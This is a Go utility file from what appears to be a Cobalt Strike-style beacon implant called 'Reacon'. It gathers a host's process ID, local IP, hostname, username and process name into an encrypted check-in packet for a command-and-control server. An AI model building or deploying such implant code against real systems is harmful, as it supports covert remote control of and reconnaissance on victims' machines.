package utils

import (
	"Reacon/pkg/encrypt"
	"Reacon/pkg/sysinfo"
	"bytes"
	"encoding/binary"
	"fmt"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io/ioutil"
	"unicode/utf8"
)

func EncryptedMetaInfo() ([]byte, error) {
	packetUnencrypted := MakeMetaInfo()
	packetEncrypted, err := encrypt.Encrypt(packetUnencrypted)
	if err != nil {
		return nil, err
	}

	//finalPakcet := base64.StdEncoding.EncodeToString(packetEncrypted)
	return packetEncrypted, nil
}

/*
MetaData for 4.1

	ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
	InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
*/
/*
	PID(4) | Flag(1) | IP(4) | OSINFO(
*/
func MakeMetaInfo() []byte {

	processID := sysinfo.GetPID()
	metadataFlag := sysinfo.GetMetaDataFlag()
	processName := sysinfo.GetProcessName()
	localIP := sysinfo.GetLocalIPInt()
	hostName := sysinfo.GetComputerName()
	currentUser, _ := sysinfo.GetUsername()

	processIDBytes := make([]byte, 4)
	flagBytes := make([]byte, 1)
	localIPBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(processIDBytes, uint32(processID))
	flagBytes[0] = byte(metadataFlag)
	binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))

	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
	if len(osInfo) > 58 {
		osInfo = osInfo[:58]
	}
	osInfoBytes := []byte(osInfo)

	//fmt.Printf("clientID: %d\n", clientID)
	onlineInfoBytes := BytesCombine(processIDBytes, flagBytes, localIPBytes, osInfoBytes)

	return onlineInfoBytes
}
func ReadInt(b []byte) uint32 {
	return binary.BigEndian.Uint32(b)
}
func WriteInt(nInt int) []byte {
	bBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(bBytes, uint32(nInt))
	return bBytes
}
func CodepageToUTF8(b []byte) ([]byte, error) {
	if !utf8.Valid(b) {
		reader := transform.NewReader(bytes.NewReader(b), simplifiedchinese.GBK.NewDecoder())
		d, e := ioutil.ReadAll(reader)
		if e != nil {
			return nil, e
		}
		return d, nil
	}
	return b, nil
}
